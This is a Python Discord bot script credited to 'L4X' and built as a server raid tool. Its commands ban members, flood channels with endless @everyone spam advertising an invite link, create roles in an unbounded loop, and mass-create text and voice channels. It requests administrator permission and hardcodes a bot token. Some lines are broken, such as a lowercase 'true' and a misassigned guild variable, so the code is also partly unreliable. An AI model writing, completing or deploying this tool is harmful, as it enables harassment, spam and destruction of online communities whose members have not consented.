# Made By L4X
# Invite = https://discordapp.com/oauth2/authorize?client_id=728644170088054826&permissions=8&scope=bot


import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get

 
##PREFIX##

bot = commands.Bot(command_prefix='!')

client = commands.Bot(command_prefix='!')

##OTHER##
bot.remove_command('help')



##BOT IS READY##
@bot.event
async def on_ready():
#BOT STATUS#
    print("Bot Is Online! Getting Ready To Spam.")
    print(f"Bot Status: Online!...")



##BAN COMMAND##
@bot.command(pass_context=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

 
##SPAM COMMAND##
@bot.command(pass_context=True)
async def spam(ctx): #run "!spam" to run the command
    await ctx.message.delete()
    while True:
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n") 
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")
        await ctx.send("Discord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\nDiscord Spammed You Join This Server Now https://discord.gg/ycPTyMQ@everyone\n")



        
##SPAM ROLE##
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="L$X")



##MAKE CHANNELS##
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('I') 
    await guild.create_text_channel('build')
    await guild.create_text_channel('this')
    await guild.create_text_channel('for')
    await guild.create_text_channel('fun')
    await guild.create_text_channel('Love from L4x')
    await guild.create_text_channel('Love from L4x')
    await guild.create_text_channel('Love from L4x')
    await guild.create_text_channel('Love from L4x')


##MAKE VOICECHANNELS##
@bot.command(pass_context=true)
async def channel(ctx):
    await ctx.message.delete()
    guild = ctx.message.delete
    await guild.create_voice_channel('lol')
    await guild.create_voice_channel('lol')
    await guild.create_voice_channel('lol')
    await guild.create_voice_channel('lol')
    await guild.create_voice_channel('lol')
    await guild.create_voice_channel('lol')	
    await guild.create_voice_channel('lol')


##BOT TOKEN##
bot.run ("UVBFaaF9Q0N-E6N4ectteJNvOEuRfzKM")
